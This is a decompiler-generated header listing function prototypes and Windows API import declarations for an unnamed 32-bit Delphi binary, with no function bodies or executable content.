_DWORD *__fastcall sub_41C5E4(int *a1, int a2, int a3, _DWORD *a4);
_DWORD *__fastcall sub_41C608(int *a1, volatile __int32 *a2);
bool sub_41C704();
// _DWORD __fastcall Sysutils::CheckWin32Version(int, int); idb
// int __usercall sub_41C9EC@<eax>(long double a1@<st0>);
// void __stdcall VariantInit(VARIANTARG *pvarg);
// HRESULT __stdcall VariantClear(VARIANTARG *pvarg);
// HRESULT __stdcall VariantCopy(VARIANTARG *pvargDest, VARIANTARG *pvargSrc);
// HRESULT __stdcall VariantChangeType(VARIANTARG *pvargDest, VARIANTARG *pvarSrc, USHORT wFlags, VARTYPE vt);
HRESULT __stdcall sub_41CB00(VARIANTARG *pvargDest, VARIANTARG *pvarSrc, int a3, __int16 a4, VARTYPE vt);
int __stdcall sub_41CBD8(int a1, int a2, int a3, float *a4);
int __stdcall sub_41CC48(int a1, int a2, int a3, double *a4);
// int __userpurge sub_41CCB8@<eax>(int a1@<ebx>, int a2, int a3, int a4, double *a5);
int __stdcall sub_41CD28(int a1, int a2, int a3, int a4);
int __fastcall sub_41CE18(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, char a7, int a8);
int __stdcall sub_41CEB8(int a1, int a2, int a3, int a4, _DWORD *a5);
int __stdcall sub_41CF58(__int16 a1, int a2, int a3, _DWORD *a4);
// HRESULT __stdcall SafeArrayGetLBound(SAFEARRAY *psa, UINT nDim, LONG *plLbound);
// HRESULT __stdcall SafeArrayGetUBound(SAFEARRAY *psa, UINT nDim, LONG *plUbound);
// _DWORD *__usercall sub_41E1D4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_41E228@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// _DWORD *__usercall sub_41E2C4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_41E2CC@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_41E320@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>);
// _DWORD *__usercall sub_41E3BC@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD __fastcall Variants::VarResultCheck(Variants *__hidden this, int); idb
// _DWORD *__usercall sub_41E6A4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int __fastcall sub_41E6F8(SAFEARRAY *psa, UINT nDim); // idb
int __fastcall sub_41E734(VARIANTARG *pvarg, int a2);
_DWORD *__fastcall sub_41E7D0(VARIANTARG *pvarg, int a2, int a3);
// int __fastcall Variants::__linkproc__ VarClear(_DWORD); weak
void __spoils<edx,ecx> sub_41E87C();
// int __usercall sub_41E8B4@<eax>(int a1@<eax>, int a2@<edx>, int a3);
// int __fastcall unknown_libname_108(int, VARIANTARG *pvargSrc); idb
volatile __int32 *__fastcall sub_41EAE0(VARIANTARG *a1, VARIANTARG *pvargSrc, int a3);
VARIANTARG *__fastcall sub_41EBD0(VARIANTARG *result, VARIANTARG *pvargSrc, int a3);
// int __fastcall unknown_libname_109(int, int, int, int, int); idb
// int __fastcall unknown_libname_110(int, int, int, int, int); idb
// int __fastcall unknown_libname_111(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_112(_DWORD, _DWORD); weak
int __fastcall sub_41EDFC(VARIANTARG *pvargSrc, int a2, int a3);
// int __fastcall unknown_libname_113(_DWORD, _DWORD); weak
// int __usercall sub_41EEF0@<eax>(CHAR **a1@<eax>, VARIANTARG *a2@<edx>, __int32 a3@<ecx>, int a4@<edi>);
// int __fastcall unknown_libname_114(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_115(VARIANTARG *pvargSrc); idb
BOOL __fastcall sub_41F82C(unsigned __int16 *a1, _DWORD *a2);
// int __usercall sub_41F908@<eax>(BSTR *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<edi>);
// int __fastcall unknown_libname_116(VARIANTARG *pvargSrc); idb
// int __fastcall unknown_libname_117(_DWORD, _DWORD); weak
// int __usercall sub_420128@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<edi>);
// int unknown_libname_118(); weak
// int __usercall sub_420AB4@<eax>(unsigned __int16 a1@<ax>, volatile __int32 *a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
// int __cdecl sub_420C98(_DWORD, _DWORD, _DWORD); weak
int sub_420D30();
int __fastcall sub_420E6C(int a1, int a2, int a3, int a4);
int sub_420ED8();
char __fastcall sub_420EDC(int a1, int a2, int a3, _WORD *a4);
// _DWORD *__usercall sub_420EF8@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_420F00@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD *__usercall sub_420F08@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
char __fastcall sub_420F10(int a1, int a2, int a3, _WORD *a4);
// _DWORD *__usercall sub_420F24@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
BOOL __fastcall sub_420F78(unsigned __int16 a1, _DWORD *a2, int a3);
int sub_42103C();
// HRESULT __stdcall CoInitialize(LPVOID pvReserved);
// void __stdcall CoUninitialize();
// void __stdcall CoTaskMemFree(LPVOID pv);
// HINTERNET __stdcall HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// BOOL __stdcall HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
// BOOL __stdcall HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// BOOL __stdcall InternetCloseHandle(HINTERNET hInternet);
// HINTERNET __stdcall InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// BOOL __stdcall InternetCrackUrlW(LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents);
// HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// BOOL __stdcall InternetSetOptionW(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
// BOOL __stdcall GetVersionExW_0(LPOSVERSIONINFOW lpVersionInformation);
// BOOL __stdcall EnumResourceLanguagesW(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, ENUMRESLANGPROCW lpEnumFunc, LONG_PTR lParam);
// BOOL __stdcall VerifyVersionInfoW_0(LPOSVERSIONINFOEXW lpVersionInformation, DWORD dwTypeMask, DWORDLONG dwlConditionMask);
// ULONGLONG __stdcall VerSetConditionMask_0(ULONGLONG ConditionMask, DWORD TypeMask, BYTE Condition);
// BOOL __stdcall CreateProcessW_0(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall TzSpecificLocalTimeToSystemTime(const TIME_ZONE_INFORMATION *lpTimeZoneInformation, const SYSTEMTIME *lpLocalTime, LPSYSTEMTIME lpUniversalTime);
// BOOL __stdcall GlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall SetDllDirectoryW(LPCWSTR lpPathName);
// DWORD __stdcall FormatMessageW_0(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPWSTR lpBuffer, DWORD nSize, va_list *Arguments);
// HANDLE __stdcall OpenJobObjectW(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// BOOL __stdcall QueryInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength, LPDWORD lpReturnLength);
// BOOL __stdcall SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
// HANDLE __stdcall OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
// BOOL __stdcall CheckRemoteDebuggerPresent(HANDLE hProcess, PBOOL pbDebuggerPresent);
// LANGID __stdcall GetUserDefaultUILanguage_0();
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// DWORD __stdcall SetNamedSecurityInfoW(LPWSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// DWORD __stdcall SetSecurityInfo(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// BOOL __stdcall CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID pSid, DWORD *cbSid);
// BOOL __stdcall AddAccessAllowedAceEx(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD AccessMask, PSID pSid);
// BOOL __stdcall AddAccessDeniedAceEx(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD AccessMask, PSID pSid);
// BOOL __stdcall AddAuditAccessAceEx(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD dwAccessMask, PSID pSid, BOOL bAuditSuccess, BOOL bAuditFailure);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// BOOL __stdcall AddAccessAllowedObjectAce(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD AccessMask, GUID *ObjectTypeGuid, GUID *InheritedObjectTypeGuid, PSID pSid);
// BOOL __stdcall AddAccessDeniedObjectAce(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD AccessMask, GUID *ObjectTypeGuid, GUID *InheritedObjectTypeGuid, PSID pSid);
// BOOL __stdcall AddAuditAccessObjectAce(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD AccessMask, GUID *ObjectTypeGuid, GUID *InheritedObjectTypeGuid, PSID pSid, BOOL bAuditSuccess, BOOL bAuditFailure);
// HRESULT __stdcall SHGetFolderPathW(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
// BOOL __stdcall ShellExecuteExW(LPSHELLEXECUTEINFOW lpExecInfo);
FARPROC __fastcall sub_4214C0(int a1, const CHAR *a2);
int sub_4214F0();
void sub_422490();
void sub_4224A0();
// int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD); weak
unsigned __int64 sub_4237C0();
__int64 __fastcall sub_423830(__int64 *a1);
__int64 __fastcall sub_423850(_QWORD *a1);
bool __fastcall sub_423880(_QWORD *a1, __int64 a2);
int sub_4238C0();
volatile __int32 *__fastcall sub_4238D0(volatile __int32 *a1);
volatile __int32 *__fastcall sub_4238F0(volatile __int32 *a1);
int __fastcall sub_423910(int a1);
DWORD sub_423990();
DWORD sub_4239A0();
int sub_4239B0();
// _DWORD __fastcall Xmlschema::TXMLSchemaDoc::CheckSchemaVersion(Xmlschema::TXMLSchemaDoc *__hidden this); idb
// int __fastcall sub_423A30(_DWORD, _DWORD); weak
// int __usercall sub_423AF0@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>);
BOOL __fastcall sub_423BF0(__int32 a1, char a2);
// BOOL __usercall sub_423E00@<eax>(int a1@<eax>, char a2@<dl>, BOOL a3@<ebx>);
_DWORD *__fastcall sub_423EB0(Classes::TStream *this, _DWORD *a2);
int __fastcall sub_423F10(__int32 a1, __int32 a2, int a3, volatile __int32 *a4);
int __fastcall sub_424040(int a1, int a2, char a3);
int __fastcall sub_424110(int a1, int a2, char a3);
int __fastcall sub_4241E0(int a1, int a2, int a3);
int __fastcall sub_424290(unsigned __int16 *a1, _BYTE *a2, int a3);
_DWORD *__fastcall sub_424490(int a1, int a2, _DWORD *a3);
unsigned __int8 __fastcall sub_4244F0(_BYTE *a1, unsigned __int8 **a2);
unsigned __int16 __fastcall sub_424550(_WORD *a1, unsigned __int16 **a2);
unsigned __int8 __fastcall sub_4245B0(_BYTE *a1, unsigned __int8 **a2);
int *__fastcall sub_424610(int *result);
int *__fastcall sub_424650(int *result);
_DWORD *__fastcall sub_424690(unsigned int a1, int *a2);
int __fastcall sub_4246C0(int a1);
int *__fastcall sub_4246F0(int *result);
int *__fastcall sub_424720(int *result);
_DWORD *__fastcall sub_424750(int a1, int a2, _DWORD *a3);
volatile __int32 *__fastcall sub_424820(int a1, int a2, volatile __int32 *a3);
volatile __int32 *__fastcall sub_424890(int a1, int a2, int a3, volatile __int32 *a4);
// _DWORD __stdcall Strutils::IfThen(_DWORD); weak
int __fastcall sub_424950(char a1, volatile __int32 *a2, __int64 a3, __int64 a4, __int64 a5);
// int __userpurge sub_424C50@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>, int a4@<ebx>, int a5@<esi>, __int64 a6);
// _DWORD *__userpurge sub_424F30@<eax>(int *a1@<eax>, int a2@<esi>, __int64 a3);
// _DWORD *__userpurge sub_424FE0@<eax>(int *a1@<eax>, int a2@<esi>, __int64 a3);
_DWORD *__fastcall sub_425090(unsigned __int16 *a1, volatile __int32 *a2, int a3, int a4, int a5);
int __fastcall sub_4250F0(int a1);
_DWORD *__fastcall sub_425120(int a1, _WORD *a2);
int __fastcall sub_4251A0(int a1, int a2);
bool __fastcall sub_425200(int a1, int a2);
unsigned __int8 __fastcall sub_425250(int a1, volatile __int32 *a2);
unsigned __int8 __fastcall sub_4252A0(int a1, volatile __int32 *a2);
int __fastcall sub_4252F0(int a1, int a2);
int __fastcall sub_425360(int a1, int a2, int a3);
_DWORD *__fastcall sub_4253F0(int a1, _DWORD *a2);
_DWORD *__fastcall sub_425430(int a1, _DWORD *a2);
_DWORD *__fastcall sub_4254A0(int a1, _DWORD *a2);
// int __fastcall Sysutils::ChangeFileExt(int, void *); idb
int __fastcall sub_425590(int a1, __int16 a2);
__int64 __fastcall sub_4255C0(int a1, char a2);
// BOOL __usercall sub_425600@<eax>(int a1@<eax>, BOOL a2@<ebx>, int a3@<esi>);
int __fastcall sub_4256E0(unsigned int a1, unsigned __int8 a2, int *a3);
int __fastcall sub_4257E0(unsigned __int8 a1, int *a2, unsigned __int64 a3);
int __fastcall sub_425AE0(signed int a1, int *a2);
int __fastcall sub_425B10(int *a1, signed __int64 a2);
// _DWORD __stdcall unknown_libname_127(_DWORD, _DWORD); weak
int __stdcall sub_425B80(int a1);
int __fastcall sub_425BB0(Idthreadcomponent::TIdThreadComponent *this);
int sub_425CA4(); // weak
BOOL sub_425CB0();
void sub_425D10();
bool __fastcall sub_425ED0(unsigned __int8 a1, int a2);
int sub_425F00();
int sub_425F20();
void __fastcall sub_425F40(struct _OSVERSIONINFOW *a1);
int sub_425F60();
int __fastcall sub_425F70(int a1, int a2, int a3);
int sub_425FD0();
int *__fastcall sub_426040(int a1, int *a2);
// BOOL __usercall sub_4260A0@<eax>(void *a1@<eax>, unsigned __int8 a2@<dl>, int a3);
// int __usercall sub_426210@<eax>(int a1@<eax>, DWORD a2@<ebx>);
_DWORD *__fastcall sub_426830(int a1, int *a2);
_DWORD *__fastcall sub_426940(int a1, _DWORD *a2);
_DWORD *__fastcall sub_426A10(int cchLength, int *a2);
_DWORD *__fastcall sub_426A60(int cchLength, int *a2);
int __fastcall sub_426AB0(int cchCount1, int a2);
int __fastcall sub_426B00(int a1);
BOOL __fastcall sub_426B80(int a1, int a2);
BOOL __fastcall sub_426BB0(int a1);
// int __usercall sub_426C10@<eax>(int a1@<eax>, int a2@<ebx>);
bool __fastcall sub_426C60(int a1);
int __fastcall sub_426C90(int a1);
BOOL __fastcall sub_426D20(int a1);
BOOL __fastcall sub_426D40(int a1);
HANDLE __fastcall sub_426D60(int a1, __int16 a2);
int __fastcall sub_426E30(int a1, char a2, DWORD *a3);
HMODULE __fastcall sub_426EB0(int a1, char a2);
FARPROC __fastcall sub_427020(HMODULE hModule, int a2);
_DWORD *__fastcall sub_427040(volatile __int32 *a1);
_DWORD *__fastcall sub_427100(const WCHAR *a1);
int *__fastcall sub_427220(int (__fastcall *a1)(int, unsigned int, int), unsigned int a2, int a3, int *a4);
int *__fastcall sub_427290(int (__fastcall *a1)(int, unsigned int, int), unsigned int a2, int a3, int *a4);
DWORD __fastcall sub_427310(LPWSTR lpBuffer, DWORD nBufferLength);
DWORD __fastcall sub_427320(LPWSTR lpFilename, DWORD nSize, HMODULE *a3);
DWORD __fastcall sub_427330(LPSTR lpFilename, DWORD nSize, HMODULE *a3);
DWORD __fastcall sub_427340(LPWSTR lpszLongPath, DWORD cchBuffer, LPCWSTR lpszShortPath);
DWORD __fastcall sub_427350(LPWSTR lpBuffer, DWORD nBufferLength);
DWORD __fastcall sub_427360(LPWSTR lpBuffer, DWORD nSize, LPCWSTR lpName);
int *__fastcall sub_427370(int a1, int *a2);
int *__fastcall sub_4273A0(int a1, int *a2);
int *__fastcall sub_4273D0(int *a1);
int *__fastcall sub_4273F0(int *a1);
int *__fastcall sub_427410(int a1, int *a2);
int *__fastcall sub_427440(int a1, int *a2);
__int64 __fastcall sub_427470(_DWORD *a1);
// _DWORD __fastcall Classes::TStream::SetPosition(Classes::TStream *__hidden this, const __int64); idb
__int64 __fastcall sub_4274C0(_DWORD *a1);
void __stdcall sub_427510(int a1, int a2);
// __int64 __userpurge sub_427520@<edx:eax>(int *a1@<eax>, int a2@<edi>, int a3@<esi>, int a4, int a5);
// int __usercall sub_4275A0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
// int __usercall sub_427610@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
char __stdcall sub_427680(int a1, int a2);
__int64 __fastcall sub_427690(_DWORD *a1, int *a2, __int64 a3);
// int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD); weak
int __fastcall sub_4278A0(int a1, void *a2, DWORD a3);
DWORD __fastcall sub_4278C0(int a1, const void *a2, DWORD a3);
int __fastcall sub_4278E0(int a1, char a2, __int64 a3);
// _DWORD __fastcall Classes::TCustomMemoryStream::SetPointer(Classes::TCustomMemoryStream *__hidden this, void *, int); idb
int __fastcall sub_427950(_DWORD *a1, void *a2, int a3);
__int64 __fastcall sub_4279A0(int a1, char a2, int a3, int a4, int a5);
// int __usercall sub_4279F0@<eax>(int result@<eax>, int a2@<edx>, int a3@<edi>);
int sub_427A10();
int __fastcall sub_427A40(_DWORD *a1);
int __cdecl sub_427A50(int a1);
int __fastcall sub_427A80(int a1, int a2);
int __fastcall sub_427AB0(_DWORD *a1, int a2);
int __fastcall sub_427AF0(_DWORD *a1, __int64 a2);
// int __usercall sub_427B30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
int __fastcall sub_427BA0(_DWORD *a1, const void *a2, int a3);
// _DWORD __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, HMODULE hModule, _DWORD, _DWORD); weak
// _DWORD *__usercall sub_427C60@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
DWORD __fastcall sub_427D10(int a1, HMODULE hModule, const WCHAR *a3, const WCHAR *lpType, LPCWSTR a5);
int sub_427D90();
// int __usercall sub_427DD0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// _DWORD __fastcall Idthreadcomponent::TIdThreadComponent::SetThreadName(Idthreadcomponent::TIdThreadComponent *__hidden this, const int System::AnsiString); idb
// int __fastcall sub_427E50(_DWORD, _DWORD); weak
// _DWORD __fastcall Idthreadcomponent::TIdThreadComponent::SetThreadName(Idthreadcomponent::TIdThreadComponent *__hidden this, const int System::AnsiString); idb
int sub_427F10();
int __fastcall sub_427F40(_DWORD *a1, int a2);
int __fastcall sub_427F90(Idthreadcomponent::TIdThreadComponent *this);
int *__fastcall sub_427FB0(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString);
// int __usercall sub_428020@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>);
int __fastcall sub_428060(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString);
int __fastcall sub_428090(int a1);
int __fastcall sub_4280D0(int a1, int a2);
int __fastcall sub_428100(int a1, int a2, char a3);
// int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD); weak
int __fastcall sub_428150(Idthreadcomponent::TIdThreadComponent *this, int a2, char a3);
int __fastcall sub_428180(int result, int a2);
int __fastcall sub_4281C0(int this, int System::AnsiString);
int __fastcall sub_428270(int result);
int __fastcall sub_4282A0(int a1, char a2);
// void __fastcall Idthreadsafe::TIdThreadSafeStringList::~TIdThreadSafeStringList(Idthreadsafe::TIdThreadSafeStringList *__hidden this); idb
int __fastcall sub_428380(int a1);
int __fastcall sub_4283A0(int a1);
char sub_4283C0();
int sub_4283D0();
// int __usercall sub_428410@<eax>(int a1@<eax>, DWORD dwMilliseconds@<edx>, int a3@<ebx>);
// int __fastcall Teengine::TChartValueList::TChartValueList(int, int, LPSECURITY_ATTRIBUTES lpEventAttributes, int, char, char); idb
int __fastcall sub_4284D0(int a1, char a2);
BOOL __fastcall sub_428520(int a1);
BOOL __fastcall sub_428530(int a1);
int __fastcall sub_428540(int a1, char a2);
int sub_428590();
void __fastcall sub_4285D0(int a1);
void __fastcall sub_4285E0(int a1);
int __fastcall sub_4285F0(int (__fastcall ***a1)(_DWORD));
int __fastcall sub_428600(int a1);
int sub_428610();
_DWORD *__fastcall sub_4286D0(int a1, void *a2, int a3);
int __fastcall sub_4287F0(int a1, unsigned __int16 *a2, unsigned __int16 *a3);
_DWORD *__fastcall sub_428890(_DWORD *a1, int a2, __int16 a3);
_DWORD *__fastcall sub_4289A0(int a1, int a2);
_DWORD *__fastcall sub_4289D0(_DWORD *a1, int a2);
int __fastcall sub_4289E0(int a1);
// _DWORD __fastcall Ibservices::TLicenseMaskInfo::Clear(Ibservices::TLicenseMaskInfo *__hidden this); idb
int __fastcall sub_428A10(int a1, char a2, int a3, int a4);
bool __fastcall sub_428A60(int a1);
int __fastcall sub_428A70(_DWORD *a1);
int sub_428AC0();
void (__fastcall ***__fastcall sub_428AF0(_DWORD *a1))(_DWORD);
void (**__fastcall sub_428B20(_DWORD *a1, void (***a2)(void)))(void);
_DWORD *__fastcall sub_428B50(_DWORD *result, int a2);
bool __fastcall sub_428B70(_DWORD *a1);
int __fastcall sub_428BA0(_DWORD *a1);
_DWORD *__fastcall sub_428BE0(_DWORD *a1, void (__fastcall **a2)(_DWORD));
int __fastcall sub_428C20(int a1);
bool __fastcall sub_428C90(_QWORD *a1);
__int64 __fastcall sub_428CA0(_QWORD *a1, _QWORD *a2);
int sub_428CD0();
// int __usercall sub_428D20@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>);
// _DWORD __fastcall Idthreadcomponent::TIdThreadComponent::SetThreadName(Idthreadcomponent::TIdThreadComponent *__hidden this, const int System::AnsiString); idb
// int __fastcall sub_428DC0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
volatile __int32 *__fastcall sub_428E60(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString, volatile __int32 *a3);
int __fastcall sub_428E90(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString);
int __fastcall sub_428EC0(int a1, int a2, int a3);
_BYTE *__fastcall sub_429060(_BYTE *result, char a2);
// _DWORD *__usercall sub_429080@<eax>(int a1@<edi>, int a2@<esi>);
// int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD); weak
// int __usercall sub_429140@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>);
// _DWORD *__usercall sub_429290@<eax>(int a1@<eax>, int a2@<edi>);
int __fastcall sub_429320(int result);
int __fastcall sub_429350(Idthreadcomponent::TIdThreadComponent *this, unsigned int System::AnsiString);
int __fastcall sub_4293C0(_BYTE *a1, int a2, signed int *a3);
// int __usercall sub_4294E0@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
// int __userpurge sub_4294F0@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7);
int (__fastcall *__fastcall sub_429640(_BYTE *a1, int a2))(_DWORD, _DWORD, _DWORD);
int __fastcall sub_429710(int a1);
int __fastcall sub_429B60(unsigned __int16 *a1, unsigned __int16 *a2);
int __fastcall sub_429C00(unsigned __int16 *a1, int a2, int a3);
int __fastcall sub_429C60(int a1, int a2);
int __fastcall sub_429C70(int a1);
// int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD); weak
int __fastcall sub_429CF0(int a1, int a2);
int __fastcall sub_429D30(int a1, int a2, int a3, char a4);
int sub_429DC0();
int __fastcall sub_429DD0(int a1);
volatile __int32 *__fastcall sub_429E10(int a1, int a2);
int __fastcall sub_429E30(int a1, char a2, int a3, int a4, char a5);
bool __fastcall sub_429EA0(int a1);
int __fastcall sub_429ED0(_DWORD *a1, int a2);
int __fastcall sub_429F00(int a1);
int __fastcall sub_429F50(_DWORD *a1);
int __fastcall sub_429F90(_DWORD *a1);
int sub_429FB0();
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
__int16 __fastcall sub_42A0C0(int a1);
int sub_42A130(); // weak
void sub_42A140();
int __fastcall sub_42A200(char a1, signed int a2, __int32 a3);
void sub_42A3A0();
// _DWORD __stdcall sub_42A590(_DWORD, char, _DWORD, _DWORD); weak
bool __fastcall sub_42A700(int a1);
int __fastcall sub_42A720(int result);
int __fastcall sub_42A740(int a1);
char __fastcall sub_42A770(void *a1, const void *a2, SIZE_T a3);
// _DWORD __fastcall Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(Iddatetimestamp::TIdDateTimeStamp *__hidden this); idb
int __cdecl sub_42A820(int a1);
_DWORD *__fastcall sub_42A8C0(_DWORD *a1, char a2);
char __fastcall sub_42A920(int a1, int a2, int a3, int a4, unsigned __int8 (__fastcall *a5)(int, int, int, int, int, int, int, int, int));
char __fastcall sub_42AA70(int a1, int a2, int a3, int a4, unsigned __int8 (__fastcall *a5)(int, int, int, int, int, int));
char __fastcall sub_42AB20(int a1, char a2, int a3, int a4, unsigned __int8 (__fastcall *a5)(int, int, int, _DWORD, _WORD *, _DWORD, int, int), int *a6, int a7, int a8, int a9, int a10);
char __fastcall sub_42AC00(int a1, int a2, int *a3, int a4, int (__fastcall *a5)(int, int, int, int, unsigned __int16 *, _DWORD, int, int), int a6, int a7);
bool __fastcall sub_42ACC0(int a1);
int __fastcall sub_42ACE0(int a1, int a2);
char __fastcall sub_42AD20(int a1, int a2, char a3, _BYTE *a4, int *a5, int a6, int a7, int a8, int a9);
char __fastcall sub_42ADE0(int a1, int a2, _BYTE *a3, int *a4, int a5, int a6);
char __fastcall sub_42AEA0(int a1, int a2, int a3, int a4, _BYTE *a5, int a6, void *a7, _BYTE *a8);
// int __usercall sub_42B210@<eax>(int a1@<ebp>);
void **sub_42B220();
struct _EXCEPTION_REGISTRATION_RECORD *sub_42B230();
PVOID sub_42B240();
void sub_42B250();
PVOID __fastcall sub_42B260(LPCVOID lpAddress);
int __fastcall sub_42B2A0(int a1);
int __cdecl sub_42B2D0(int a1);
int __fastcall sub_42B330(int a1, char a2);
int __fastcall sub_42B410(int a1, int a2, int (__fastcall *a3)(unsigned int, int), int a4, char a5);
// int __usercall sub_42B4C0@<eax>(int a1@<eax>, int a2);
// int __usercall sub_42B4F0@<eax>(int a1@<eax>, int a2@<edx>, int a3);
_DWORD *__fastcall sub_42B660(int a1, int a2, int a3);
bool __fastcall sub_42B700(LPCSTR lpString1, LPCSTR lpString2, int cchCount2, unsigned __int8 a4);
int __fastcall sub_42B740(int a1);
int __fastcall sub_42B760(int a1);
